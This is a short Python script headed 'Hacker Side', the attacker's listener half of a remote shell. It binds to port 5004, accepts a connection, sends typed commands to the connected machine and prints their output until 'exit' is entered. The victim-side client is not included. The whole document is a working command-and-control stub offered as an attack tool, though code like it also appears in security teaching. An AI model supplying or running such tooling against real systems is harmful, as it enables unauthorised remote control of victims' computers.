# Hacker Side
import socket

# Connection Job
host = "0.0.0.0"
port = 5004
with socket.socket() as sc:
    sc.bind((host, port))
    sc.listen(1)
    c, a = sc.accept()
# Connection Job
# Command Job
    while True:
        cmd = input(f"{a}>")
        c.send(cmd.encode())
        if cmd.lower() == "exit":
            break;
        ret = c.recv(1024).decode()
        print(ret)
# Command Job
